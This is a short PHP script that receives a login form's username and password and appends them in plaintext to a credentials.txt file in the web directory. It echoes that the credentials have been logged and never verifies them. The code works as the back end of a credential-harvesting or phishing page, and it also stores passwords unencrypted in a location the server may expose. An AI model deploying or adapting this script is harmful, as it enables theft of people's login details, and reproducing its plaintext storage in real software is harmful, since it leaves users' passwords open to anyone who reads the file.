<?php 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare log entry
    $log = "Username: $username, Password: $password\n";

    // Create or append to credentials.txt in the same directory
    $file = 'credentials.txt';

    // Check if file is writable or can be created
    if (file_put_contents($file, $log, FILE_APPEND | LOCK_EX)) {
        echo "Login successful. Your credentials have been logged.";
    } else {
        echo "Error: Unable to write to file.";
    }
}
?>
